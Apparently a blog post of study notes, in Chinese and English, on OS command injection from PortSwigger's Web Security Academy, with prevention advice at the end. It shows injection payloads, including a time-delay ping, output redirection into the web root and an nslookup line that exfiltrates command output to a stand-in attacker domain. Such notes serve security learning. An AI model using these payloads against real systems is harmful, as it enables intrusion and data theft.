---
layout: article
title: WSAcademy 4 -- OS command injection
mathjax: true
key: a00015
cover: /bkgs/1.png
modify_date: 2021-10-15
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- Command injection 
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的OS command injection部分<!--more-->

原文：[What is OS command injection, and how to prevent it? ](https://portswigger.net/web-security/os-command-injection)

# OS command injection

| **Purpose of command** | **Linux**    | **Windows**    |
| ---------------------- | ------------ | -------------- |
| Name  of current user  | whoami       | whoami         |
| Operating  system      | uname  -a    | ver            |
| Network  configuration | ifconfig     | ipconfig  /all |
| Network  connections   | netstat  -an | netstat  -an   |
| Running  processes     | ps  -ef      | tasklist       |

Many instances of OS command injection are blind vulnerabilities. 

就是说返回看不到结果，就需要一些技巧：

## using time delays

比如ping命令，like：

& ping -c 10 127.0.0.1 &

This command will cause the application to ping its loopback network adapter for 10 seconds.

`||` to comment （wtf？）

## redirecting output

like：& whoami > /var/www/static/whoami.txt &

and fetch https://vulnerable-website.com/whoami.txt to retrieve the file

## using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

利用外带来取数据, using OAST techniques.

For example:  `& nslookup kgji2ohoyw.web-attacker.com &`

exfiltrate the output

```shell
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

result would be :  wwwuser.kgji2ohoyw.web-attacker.com

## Ways of injecting OS commands

work on both Windows and Unix-based systems:

```
&
&&
|
||
```

only on Unix-based systems:

- ;
- Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

```
` injected command `
$( injected command )
```

输入在引号内的话需要先“”

## How to prevent OS command injection attacks

- 最有效方法是永远不要从应用层代码调用OS命令

- 检查输入

- - whitelist
  - number only
  - only alphanumeric characters,  no other syntax or whitespace.

- Never attempt to sanitize input  by escaping shell metacharacters

